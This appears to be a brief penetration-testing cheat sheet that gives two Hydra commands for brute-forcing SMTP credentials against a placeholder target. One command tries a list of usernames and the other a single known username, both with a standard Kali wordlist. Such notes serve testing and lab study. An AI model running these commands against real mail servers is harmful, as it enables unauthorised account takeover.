> Brute force username and password combination:

```
hydra -L /home/kali/<users_txt> -P /usr/share/wordlists/nmap.lst <target_ip> smtp 
```

> Brute force password for a verified username:

```
hydra -l <username> -P /usr/share/wordlists/nmap.lst <target_ip> smtp 
```

